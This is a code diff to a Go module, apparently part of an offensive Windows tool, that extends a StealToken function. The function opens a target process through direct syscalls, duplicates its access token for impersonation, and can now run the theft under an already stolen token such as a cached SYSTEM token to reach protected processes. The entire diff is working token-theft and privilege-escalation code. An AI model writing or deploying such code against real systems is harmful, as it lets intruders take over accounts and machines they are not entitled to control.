@@ -109,7 +109,11 @@ func EnablePrivilege(name string) error {
 // StealToken acquires a duplicated impersonation token from targetPID.
 //
 // On first call it enables SeDebugPrivilege and SeImpersonatePrivilege.
-func StealToken(table *syscall.SyscallTable, targetPID uint32) (windows.Handle, error) {
+// StealToken steals an access token from a running process.
+// If hExistingToken is provided (non-zero), ExecuteAsToken is used so that
+// NtOpenProcess runs under that identity, allowing privilege escalation
+// scenarios (e.g. using a cached SYSTEM token to steal from protected processes).
+func StealToken(table *syscall.SyscallTable, targetPID uint32, hExistingToken ...windows.Handle) (windows.Handle, error) {
 	if table == nil {
 		return 0, fmt.Errorf("syscall table is nil")
 	}
@@ -122,28 +126,39 @@ func StealToken(table *syscall.SyscallTable, targetPID uint32) (windows.Handle, 
 		logging.Warningf("SeImpersonatePrivilege not available: %v", err)
 	}
 
-	// 1. Open handle to target process.
-	hProcess, status, err := syscall.NtOpenProcess(table, windows.PROCESS_QUERY_LIMITED_INFORMATION, targetPID)
-	if err != nil || status != syscall.STATUS_SUCCESS {
-		return 0, fmt.Errorf("NtOpenProcess failed with status 0x%08X: %v", status, err)
-	}
-	defer windows.CloseHandle(hProcess)
+	// Core steal logic: open target process, open its token, duplicate it.
+	steal := func() (windows.Handle, error) {
+		hProcess, status, err := syscall.NtOpenProcess(table, windows.PROCESS_QUERY_LIMITED_INFORMATION, targetPID)
+		if err != nil || status != syscall.STATUS_SUCCESS {
+			return 0, fmt.Errorf("NtOpenProcess failed with status 0x%08X: %v", status, err)
+		}
+		defer windows.CloseHandle(hProcess)
 
-	// 2. Open the process token.
-	var tokenAccess uint32 = windows.TOKEN_DUPLICATE | windows.TOKEN_QUERY
-	hProcessToken, status, err := syscall.NtOpenProcessToken(table, hProcess, tokenAccess)
-	if err != nil || status != syscall.STATUS_SUCCESS {
-		return 0, fmt.Errorf("NtOpenProcessToken failed with status 0x%08X: %v", status, err)
-	}
-	defer windows.CloseHandle(hProcessToken)
+		var tokenAccess uint32 = windows.TOKEN_DUPLICATE | windows.TOKEN_QUERY
+		hProcessToken, status, err := syscall.NtOpenProcessToken(table, hProcess, tokenAccess)
+		if err != nil || status != syscall.STATUS_SUCCESS {
+			return 0, fmt.Errorf("NtOpenProcessToken failed with status 0x%08X: %v", status, err)
+		}
+		defer windows.CloseHandle(hProcessToken)
 
-	// 3. Duplicate into an impersonation token.
-	hDup, err := DuplicateSystemToken(table, hProcessToken)
-	if err != nil {
-		return 0, fmt.Errorf("DuplicateSystemToken: %w", err)
+		hDup, err := DuplicateSystemToken(table, hProcessToken)
+		if err != nil {
+			return 0, fmt.Errorf("DuplicateSystemToken: %w", err)
+		}
+		return hDup, nil
 	}
 
-	return hDup, nil
+	if len(hExistingToken) > 0 && hExistingToken[0] != 0 {
+		var stolen windows.Handle
+		err := ExecuteAsToken(hExistingToken[0], func() error {
+			var innerErr error
+			stolen, innerErr = steal()
+			return innerErr
+		})
+		return stolen, err
+	}
+
+	return steal()
 }
 
 // DuplicateSystemToken duplicates a process token into an impersonation token.
